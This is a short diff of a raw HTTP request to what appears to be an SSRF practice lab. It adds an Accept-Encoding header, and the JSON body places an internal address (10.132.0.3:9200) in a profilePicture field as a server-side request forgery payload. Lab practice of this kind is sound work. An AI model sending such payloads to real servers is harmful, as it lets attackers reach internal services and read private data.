@@ -16,5 +16,6 @@ Sec-Fetch-Mode: cors
 Sec-Fetch-Dest: empty
 Referer: https://ssrflab.dpdns.org/settings
 Priority: u=1, i
+Accept-Encoding: gzip, deflate, br
 
 {"profilePicture":"http://10.132.0.3:9200"}
